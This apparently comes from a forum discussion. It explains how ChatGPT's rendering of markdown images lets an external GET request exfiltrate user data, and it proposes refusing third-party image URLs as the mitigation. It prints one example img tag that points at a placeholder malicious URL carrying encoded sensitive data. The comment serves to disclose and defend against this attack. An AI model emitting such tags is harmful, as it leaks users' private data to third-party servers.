The mitigation is that ChatGPT should refuse to render image tags or make requests for images if given a 3rd-party URL. I&#x27;m not sure if we&#x27;re talking past each other or what, but I&#x27;m not talking about whether the server returns an image. I&#x27;m saying, ChatGPT will <i>request</i> an image from an external domain as part of rendering markdown during a conversation, and that GET request can be used as an exfiltration method.<p>The response from the server has nothing to do with it. I&#x27;m talking about the fact that ChatGPT will request arbitrary URLs without user input if the URLs are formatted in a markdown block as an image src.<p>ChatGPT is rendering this:<p><pre><code>  &lt;img src=&quot;https:&#x2F;&#x2F;malicious-url&#x2F;?sensitive-user-data-encoded&quot; &#x2F;&gt;\n",
